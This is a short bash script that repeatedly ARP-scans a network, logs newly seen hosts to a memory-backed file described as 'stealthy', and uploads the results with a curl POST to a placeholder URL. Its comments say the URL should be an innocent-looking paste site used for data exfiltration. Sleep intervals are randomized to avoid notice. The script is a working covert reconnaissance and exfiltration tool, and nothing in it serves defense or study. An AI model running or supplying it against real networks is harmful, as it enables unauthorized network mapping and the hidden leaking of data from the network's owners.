#!/bin/bash
#send a notification upon new host discovery
KNOW_HOSTS="text-file-for-hosts"
NETWORK="Tell the network range"
INTERFACE="eth0" #change it according to your internet interface connection
TEMP_FILE="/dev/shm/arp_scan_results.txt" #stores the result in the memory so that it becomes stealthy, this a temporary memory of linux you can change it to windows or mac os memory.

# Innocent-looking third-party website (e.g., pastebin or hastebin)
UPLOAD_URL="xxxxxxxxxxx" #reffer to LOTS project at https://lots-project.com to upload the result on innocent looking website to do data exfliration.

while true; do
    echo "Performing an ARP scan against $NETWORK.............."

    sudo arp-scan -x -I $INTERFACE $NETWORK | while read -r line; do
        host=$(echo $line | awk '{print $1}')
        if ! grep -q $host $KNOW_HOSTS; then
            echo "found a new host $host!"
            echo $host >> $KNOW_HOSTS
            echo "$(date): New host discovered - $host" >> $TEMP_FILE
        fi
    done

    # Check if there are new results and upload them
    if [ -s "$TEMP_FILE" ]; then
        echo "Uploading results to $UPLOAD_URL..."
        response=$(curl -s -X POST -d @"$TEMP_FILE" $UPLOAD_URL)
        key=$(echo $response | jq -r .key)
        
        if [ "$key" != "null" ]; then
            echo "Results uploaded successfully. Access it at: https://hastebin.com/$key"
        else
            echo "Failed to upload results."
        fi
        
        # Clear the temporary file after upload
        > $TEMP_FILE
    fi

    # Randomize interval from seconds to hours
    MAX_WAIT=9999999 #this is in seconds.
    sleep $(( RANDOM % MAX_WAIT))
done
